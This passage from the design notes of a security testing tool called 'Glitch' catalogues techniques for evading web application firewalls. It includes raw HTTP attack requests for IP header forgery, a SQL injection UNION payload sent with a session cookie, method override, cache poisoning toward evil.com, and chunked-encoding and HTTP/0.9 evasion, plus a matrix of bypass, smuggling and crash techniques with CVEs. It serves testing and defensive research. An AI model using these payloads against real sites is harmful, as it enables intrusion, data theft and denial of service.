**Glitch implementation:** Add `SlowScanMode` to scanner with configurable rate limits and jitter patterns.

---

### 5.2 IP Rotation via Header Forgery

**How it works:** Many WAFs trust `X-Forwarded-For`, `X-Real-IP`, `CF-Connecting-IP`, and similar headers for client identification. Forging these headers makes each request appear from a different IP.

**Example:**
```http
GET /admin HTTP/1.1
Host: target.com
X-Forwarded-For: 203.0.113.42
X-Real-IP: 203.0.113.42
CF-Connecting-IP: 203.0.113.42
True-Client-IP: 203.0.113.42
```
(Rotate IP on each request)

**Vulnerable WAFs:** WAFs that trust forwarded IP headers without validation
**Expected outcome:** Rate limiting and IP-based blocking bypassed
**Glitch implementation:** Already in `internal/scanner/evasion/headers.go` as `addForgedIPHeaders()`. Server WAF proxy should demonstrate trusting/ignoring these.

---

### 5.3 User-Agent Rotation with Full Browser Fingerprint

**How it works:** Rotate not just User-Agent but the entire header fingerprint (Accept, Accept-Language, Accept-Encoding, Sec-Fetch-*, header order) to match the claimed browser. Inconsistency between UA and other headers is a detection signal.

**Example (Chrome fingerprint):**
```http
GET / HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Sec-CH-UA: "Not A(Brand";v="99", "Google Chrome";v="121"
Sec-CH-UA-Platform: "Windows"
Connection: keep-alive
```

**Vulnerable WAFs:** WAFs relying solely on UA string for bot detection
**Expected outcome:** Scanner appears as legitimate browser traffic
**Glitch implementation:** Already partially in headers.go. Add `Sec-CH-UA` client hints matching the claimed browser version.

---

### 5.4 TLS Fingerprint Mimicry (JA3/JA4)

**How it works:** WAFs fingerprint TLS handshakes (JA3/JA4 hash) to identify bot traffic. Bots must mimic real browser TLS parameters: cipher suites, extensions, ALPN, supported groups, signature algorithms.

**Example JA3 manipulation:**
```
Use Chrome's exact TLS parameters:
- Cipher suites in Chrome's order
- Extensions including GREASE values
- Supported groups: x25519, secp256r1, secp384r1
- ALPN: h2, http/1.1
```

**Vulnerable WAFs:** WAFs without JA3/JA4 fingerprinting, or with outdated fingerprint databases
**Expected outcome:** Bot traffic appears as legitimate Chrome/Firefox TLS handshake
**Glitch implementation:** Add TLS fingerprint configuration to scanner. Requires custom TLS dialer with controlled parameters.

---

### 5.5 Session-Aware Bypass

**How it works:** Authenticate normally, obtain a valid session cookie, then use the authenticated session for attack requests. WAFs may apply lighter rules to authenticated traffic.

**Example:**
```http
# Step 1: Normal login
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=valid_user&password=valid_pass

# Step 2: Attack with session cookie
GET /admin?id=1' UNION SELECT * FROM users-- HTTP/1.1
Cookie: session=abc123def456
```

**Vulnerable WAFs:** WAFs that whitelist or reduce inspection for authenticated sessions
**Expected outcome:** Attack traffic passes through with reduced WAF scrutiny
**Glitch implementation:** Add session-aware scanning mode that authenticates first, then reuses cookies for attack requests.

---

### 5.6 HTTP Method Override

**How it works:** Use `X-HTTP-Method-Override`, `X-Method-Override`, or `_method` parameter to change the effective HTTP method. WAFs may apply rules based on the original method while the backend respects the override.

**Example:**
```http
POST /api/users HTTP/1.1
X-HTTP-Method-Override: DELETE
Content-Type: application/x-www-form-urlencoded

id=1
```
WAF sees: POST request (applies POST rules)
Backend sees: DELETE request (performs deletion)

**Vulnerable WAFs:** WAFs that don't inspect method override headers
**Expected outcome:** WAF applies wrong method-specific rules
**Glitch implementation:** Add method override to scanner request builder.

---

### 5.7 Cache Poisoning via WAF Bypass

**How it works:** Combine a WAF bypass with a cacheable response. The poisoned response is cached by the CDN/proxy and served to all subsequent users without WAF re-inspection.

**Example:**
```http
GET /page?cachebuster=123 HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
```
If the response includes `evil.com` in links and gets cached, all users receive the poisoned version.

**Vulnerable WAFs:** WAFs in front of caching layers that don't cache-key all WAF-relevant headers
**Expected outcome:** Persistent attack affecting all users via cache
**Glitch implementation:** Add cache poisoning detection to scanner. Test X-Forwarded-Host, X-Forwarded-Scheme reflection.

---

### 5.8 Chunked Transfer with HTTP/1.0

**How it works:** Chunked transfer was defined in HTTP/1.1. Some firewalls (~40%) don't process Transfer-Encoding in HTTP/1.0 responses/requests, but permissive backends accept it anyway.

**Example:**
```http
POST /api HTTP/1.0
Transfer-Encoding: chunked

5
PAYLO
3
AD!
0

```

**Vulnerable WAFs:** ~40% of WAFs ignore TE in HTTP/1.0 context (HTTP Evader research)
**Expected outcome:** WAF ignores chunked body in HTTP/1.0, backend processes it
**Glitch implementation:** Add HTTP/1.0 + chunked combination to scanner protocol attacks.

---

### 5.9 Chunk Extension Abuse

**How it works:** HTTP chunk extensions (after the chunk size, separated by `;`) are rarely inspected by WAFs. Some WAFs fail to parse chunks that include extensions, skipping inspection entirely.

**Example:**
```http
POST /api HTTP/1.1
Transfer-Encoding: chunked

5;malicious-ext="value"
hello
A;another-ext
AAAAAAAAAA
0;final-ext

```

**Vulnerable WAFs:** ~20% of WAFs fail on chunk extensions (HTTP Evader)
**Expected outcome:** WAF fails to parse chunked body, skips inspection
**Glitch implementation:** Add chunk extension fuzzer to protocol attacks.

---

### 5.10 Protocol Downgrade to HTTP/0.9

**How it works:** HTTP/0.9 doesn't support headers, POST, or most features. Some backends still accept HTTP/0.9 requests. WAFs designed for HTTP/1.x may not parse these at all.

**Example:**
```
GET /admin
```
(No HTTP version, no headers, no Host, raw request)

**Vulnerable WAFs:** WAFs that require HTTP/1.x format headers to function
**Expected outcome:** WAF cannot parse the request, passes it through or errors
**Glitch implementation:** Add HTTP/0.9 raw requests to scanner via raw TCP module.

---

## Summary Matrix

| # | Technique | Category | WAFs Affected | Severity |
|---|-----------|----------|---------------|----------|
| 1.1 | Double URL Encoding | Rule Bypass | Many | High |
| 1.2 | Unicode/%uXXXX Encoding | Rule Bypass | IIS-based, NAXSI | High |
| 1.3 | HTML Entity Leading Zeros | Rule Bypass | ModSec 3.0.13 (CVE-2025-27110) | Critical |
| 1.4 | Chunked Fragmentation | Rule Bypass | 15-20% of WAFs | High |
| 1.5 | Mixed CL/TE | Rule Bypass | ~15% of WAFs | Critical |
| 1.6 | Malformed TE Values | Rule Bypass | ~25% of WAFs | High |
| 1.7 | H2 CRLF Header Injection | Rule Bypass | H2->H1 proxies | Critical |
| 1.8 | H2 Pseudo-Header Abuse | Rule Bypass | Apache mod_proxy | Critical |
| 1.9 | Charset Confusion | Rule Bypass | CRS (CVE-2026-21876) | Critical |
| 1.10 | Multipart Boundary Manipulation | Rule Bypass | Cloudflare, Azure, GCA, ModSec | Critical |
| 1.11 | HTTP Parameter Pollution | Rule Bypass | 70% of WAFs | High |
| 1.12 | SQL Comment Injection | Rule Bypass | Signature-based WAFs | Medium |
| 1.13 | Case Manipulation | Rule Bypass | Case-sensitive WAFs | Medium |
| 1.14 | Null Byte Injection | Rule Bypass | NAXSI, older ModSec | High |
| 2.1 | Slowloris | Resource Exhaustion | Apache-based | High |
| 2.2 | Slow POST | Resource Exhaustion | Body-buffering WAFs | High |
| 2.3 | Slow Read | Resource Exhaustion | Response-buffering WAFs | High |
| 2.4 | ReDoS | Resource Exhaustion | ModSec 3.x, CRS pre-3.1.1 | Critical |
| 2.5 | Large Header Flood | Resource Exhaustion | WAFs without limits | Medium |
| 2.6 | Deep JSON/XML Nesting | Resource Exhaustion | Recursive parser WAFs | High |
| 2.7 | Infinite Chunked | Resource Exhaustion | Body-buffering WAFs | High |
| 2.8 | WebSocket Upgrade Flood | Resource Exhaustion | Most WAFs | High |
| 2.9 | Response Filter DoS | Resource Exhaustion | CRS, Comodo, Atomicorp | High |
| 3.1 | CL.TE Smuggling | Parser Confusion | CL-prioritizing WAFs | Critical |
| 3.2 | TE.CL Smuggling | Parser Confusion | TE-prioritizing WAFs | Critical |
| 3.3 | TE.TE Obfuscated Smuggling | Parser Confusion | ~20% of WAFs | Critical |
| 3.4 | H2.CL Desync | Parser Confusion | H2->H1 proxies | Critical |
| 3.5 | H2.TE Desync | Parser Confusion | AWS ALB, H2 proxies | Critical |
| 3.6 | Multipart Parser Differential | Parser Confusion | Cloudflare, Azure, GCA | Critical |
| 3.7 | Duplicate Headers | Parser Confusion | Header-selection-dependent | High |
| 3.8 | CRLF Injection | Parser Confusion | Non-validating WAFs | High |
| 3.9 | Path Traversal Encoding | Parser Confusion | Single-decode WAFs | High |
| 3.10 | ModSec URL Decode Path | Parser Confusion | ModSec 3.0.0-3.0.11 (CVE-2024-1019) | Critical |
| 3.11 | Coraza URI Parser | Parser Confusion | Coraza < 3.3.3 (CVE-2025-29914) | Critical |
| 4.1 | Cookie Parsing Crash | WAF Crash | ModSec 3.0.0-3.0.3 (CVE-2019-19886) | Critical |
| 4.2 | Request Body DoS | WAF Crash | ModSec 3.0.12 (CVE-2024-46292) | High |
| 4.3 | Empty XML Tag Crash | WAF Crash | ModSec (CVE-2025-52891) | High |
| 4.4 | NAXSI Null Byte | WAF Crash | NAXSI < 1.1a | High |
| 4.5 | Content-Length Overflow | WAF Crash | 32-bit WAFs | Critical |
| 4.6 | Regex Engine Crash | WAF Crash | PCRE-based WAFs | Critical |
| 4.7 | 65KB Header Overflow | WAF Crash | Fixed-buffer WAFs | High |
| 4.8 | Chunk Size Overflow | WAF Crash | Non-validating WAFs | High |
| 5.1 | Slow Exfiltration | Detection Evasion | Fixed-window rate limiters | Medium |
| 5.2 | IP Header Forgery | Detection Evasion | Header-trusting WAFs | Medium |
| 5.3 | Full Browser Fingerprint | Detection Evasion | UA-only bot detection | Medium |
| 5.4 | TLS Fingerprint Mimicry | Detection Evasion | JA3-based WAFs | High |
| 5.5 | Session-Aware Bypass | Detection Evasion | Auth-whitelisting WAFs | Medium |
| 5.6 | HTTP Method Override | Detection Evasion | Method-based rule WAFs | Medium |
| 5.7 | Cache Poisoning | Detection Evasion | Caching WAFs | High |
| 5.8 | Chunked in HTTP/1.0 | Detection Evasion | ~40% of WAFs | High |
| 5.9 | Chunk Extension Abuse | Detection Evasion | ~20% of WAFs | Medium |
| 5.10 | HTTP/0.9 Downgrade | Detection Evasion | HTTP/1.x-only WAFs | Medium |

---

## Glitch Implementation Priority

### Already Implemented (existing in codebase)
- Double URL encoding, Unicode, HTML entity, Base64, Hex encoding (evasion/encoding.go)
- Mixed case, null byte injection, comment injection (evasion/encoding.go)
- User-agent rotation, forged IP headers, decoy headers (evasion/headers.go)
- Slowloris (attacks/slowhttp.go)
- 65KB header overflow, CRLF injection (headers/corruption.go)
- Gzip bomb, XML bomb, JSON depth bomb, infinite chunked, chunk overflow (errors/generator.go)
- WAF signature detection in proxy (proxy/waf/signatures.go)

### High Priority Additions
1. **Chunked fragmentation attack** -- split payloads across chunk boundaries
2. **CL.TE / TE.CL / TE.TE request smuggling** -- classic and obfuscated variants
3. **Multipart boundary manipulation** -- WAFFLED paper's 24 mutation classes
4. **HTTP Parameter Pollution** -- duplicate params for payload assembly
5. **ReDoS payload generator** -- target common WAF regex patterns
6. **Charset confusion attacks** -- UTF-7, IBM037, Shift-JIS body encoding
7. **ModSecurity-specific CVE attacks** -- cookie crash, path bypass, leading-zero entities
8. **Slow POST / Slow Read** -- complement existing Slowloris
9. **Response Filter DoS (RFDoS)** -- inject WAF trigger strings into stored content

### Medium Priority Additions
10. **HTTP/2 desync attacks** -- H2.CL, H2.TE, pseudo-header abuse
11. **Coraza URI parser bypass** -- double-slash path confusion
12. **WebSocket upgrade flood** -- bypass WAF via protocol upgrade
13. **Content-Length integer overflow** -- crash WAFs with extreme values
14. **Session-aware bypass mode** -- authenticate then attack
15. **HTTP/0.9 downgrade** -- raw requests without headers
16. **TLS fingerprint mimicry** -- JA3/JA4 browser impersonation

---

## Sources

- [WAFFLED: Exploiting Parsing Discrepancies (arXiv)](https://arxiv.org/html/2503.10846v1)
- [WAF Bypass Techniques 2025 (Infosec Matrix)](https://medium.com/infosecmatrix/web-application-firewall-waf-bypass-techniques-that-work-in-2025-b11861b2767b)
- [Bypassing WAFs in 2025 (gasmask)](https://medium.com/@gasmask/bypassing-wafs-in-2025-new-techniques-and-evasion-tactics-fdb3508e6b46)
- [HTTP/2: The Sequel is Always Worse (PortSwigger)](https://portswigger.net/research/http2)
- [CVE-2024-1019: ModSecurity Path Bypass](https://github.com/advisories/GHSA-w56r-g989-xqw3)
- [CVE-2025-27110: ModSecurity Leading Zeros](https://securityonline.info/cve-2025-27110-modsecurity-vulnerability-leaves-web-applications-exposed/)
- [CVE-2025-29914: Coraza URI Parser Bypass](https://www.miggo.io/vulnerability-database/cve/CVE-2025-29914)
- [CVE-2026-21876: CRS Multipart Charset Bypass](https://coreruleset.org/20260106/cve-2026-21876-critical-multipart-charset-bypass-fixed-in-crs-4.22.0-and-3.3.8/)
- [ReDoS in CRS (OWASP)](https://coreruleset.org/20190425/regular-expression-dos-weaknesses-in-crs/)
- [CVE-2019-19886: ModSecurity Cookie DoS](https://coreruleset.org/20200118/cve-2019-19886-high-dos-against-libmodsecurity-3/)
- [Response Filter DoS (RFDoS)](https://blog.sicuranext.com/response-filter-denial-of-service-a-new-way-to-shutdown-a-website/)
- [Bypassing NAXSI Filtering (Synacktiv)](https://www.synacktiv.com/en/publications/bypassing-naxsi-filtering-engine)
- [HTTP Evader: Chunked Transfer Evasion](https://noxxi.de/research/http-evader-explained-3-chunked.html)
- [HPP WAF Bypass (Ethiack)](https://blog.ethiack.com/blog/bypassing-wafs-for-fun-and-js-injection-with-parameter-pollution)
- [WAF Bypass Cheat Sheet (Bo0oM)](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
- [Awesome-WAF (0xInfection)](https://github.com/0xInfection/Awesome-WAF)
- [Slowloris Attack (Cloudflare)](https://www.cloudflare.com/learning/ddos/ddos-attack-tools/slowloris/)
- [Slow POST Attack (HAProxy)](https://www.haproxy.com/blog/what-is-a-slow-post-attack-and-how-turn-haproxy-into-your-first-line-of-defense)
- [HTTP Request Smuggling (PortSwigger)](https://portswigger.net/web-security/request-smuggling)
- [Bypassing Modern WAFs (hetmehta)](https://hetmehta.com/posts/Bypassing-Modern-WAF/)
